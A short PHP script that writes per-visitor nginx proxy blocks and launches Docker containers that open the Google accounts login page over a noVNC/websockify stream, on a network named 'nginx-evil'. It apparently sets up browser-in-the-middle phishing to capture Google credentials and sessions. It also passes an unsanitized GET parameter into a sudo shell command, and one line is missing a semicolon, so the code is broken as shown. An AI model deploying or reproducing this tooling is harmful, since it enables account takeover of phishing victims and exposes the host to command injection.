<?php
$text="location /\$server {
    proxy_pass http://\$server:5980/;
}
 location /\$server/websockify {
    proxy_pass http://\$server:5980/\$server/websockify;
    proxy_http_version 1.1;
    proxy_set_header Upgrade \$http_upgrade;
    proxy_set_header Connection \"Upgrade\";
    proxy_set_header Host \$host;
}

location /core/ {
   rewrite /core/(.*) /\$server/core/$1 break;
   proxy_pass http://\$server:5980;
}
location /vendor/ {
   rewrite /vendor/(.*) /\$server/vendor/$1 break;
   proxy_pass http://\$server:5980;
}
}";

$text2="location /\$server {
    proxy_pass http://\$server:5980/;
}
 location /\$server/websockify {
    proxy_pass http://\$server:5980/\$server/websockify;
    proxy_http_version 1.1;
    proxy_set_header Upgrade \$http_upgrade;
    proxy_set_header Connection \"Upgrade\";
    proxy_set_header Host \$host;
}
}";



$uidphp=uniqid("", true);
$uidphp=str_replace(".","_",$uidphp);
$filename = '/etc/nginx/conf.d/default.conf';
$flag = '/etc/flag.txt'




if (file_exists($flag)){
    $text_modifiqued = str_replace("\$server",$uidphp,$text2);
}else{
    $text_modifiqued = str_replace("\$server",$uidphp,$text);
}

if (is_writable($filename)) {
    $lines = file($filename);
    $last = sizeof($lines) - 1 ;
    unset($lines[$last]);

    // write the new data to the file
    $fp = fopen($filename, 'w');
    fwrite($fp, implode('', $lines));
    fwrite($fp, $text_modifiqued);
    fclose($fp);
    $fp = fopen($flag, 'a');
    fwrite($fp, "check");
    fclose($fp);
    system('sudo nginx -s reload');
    $resolu = $_GET['x'];
    echo $uidphp;
    system("sudo docker run -d --rm   -e FOLDER=".$uidphp." -e RESOLUTION=".$resolu."x24 -e WEBPAGE=https://accounts.google.com/ --network=nginx-evil --name ".$uidphp." d0c755c8b745");
}

?>
